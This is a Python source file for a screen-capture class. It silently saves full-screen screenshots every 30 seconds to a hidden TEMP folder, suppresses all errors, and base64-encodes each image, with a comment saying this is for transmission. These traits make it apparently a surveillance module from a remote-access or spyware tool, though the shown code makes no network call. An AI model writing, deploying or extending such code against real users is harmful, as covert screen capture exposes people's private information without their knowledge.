import os, time, threading, queue, base64, json
from datetime import datetime
from PIL import ImageGrab

class ScreenshotCapturer:
    def __init__(self):
        self.capturing = False
        self.capture_thread = None
        self.screenshot_queue = queue.Queue()
        self.output_dir = os.path.join(os.environ['TEMP'], 'AetherScreenshots')
        os.makedirs(self.output_dir, exist_ok=True)
        self.interval = 30  # Capture every 30 seconds
        
    def capture(self, quality=85):
        """Capture a single screenshot."""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"screenshot_{timestamp}.png"
            filepath = os.path.join(self.output_dir, filename)
            
            # Capture screen
            screenshot = ImageGrab.grab()
            screenshot.save(filepath, 'PNG')
            
            # Get base64 for transmission
            with open(filepath, 'rb') as f:
                img_base64 = base64.b64encode(f.read()).decode('utf-8')
            
            return {
                'success': True,
                'filename': filename,
                'path': filepath,
                'timestamp': timestamp,
                'resolution': screenshot.size,
                'base64_preview': img_base64[:1000] + "..." if len(img_base64) > 1000 else img_base64
            }
        except Exception as e:
            return {'error': str(e)}
    
    def start_continuous(self, interval=30):
        """Start continuous screenshot capture."""
        if self.capturing:
            return "Screenshot capture already running"
        
        self.capturing = True
        self.interval = interval
        self.capture_thread = threading.Thread(target=self._capture_loop, daemon=True)
        self.capture_thread.start()
        
        return "Screenshot capture started"
    
    def _capture_loop(self):
        """Continuous capture loop."""
        while self.capturing:
            try:
                result = self.capture()
                self.screenshot_queue.put(result)
                time.sleep(self.interval)
            except:
                pass
    
    def stop(self):
        """Stop screenshot capture."""
        self.capturing = False
        return "Screenshot capture stopped"
    
    def get_screenshots(self):
        """Get all captured screenshots."""
        screenshots = []
        for filename in os.listdir(self.output_dir):
            if filename.endswith('.png'):
                filepath = os.path.join(self.output_dir, filename)
                screenshots.append({
                    'filename': filename,
                    'path': filepath,
                    'size': os.path.getsize(filepath)
                })
        
        return screenshots
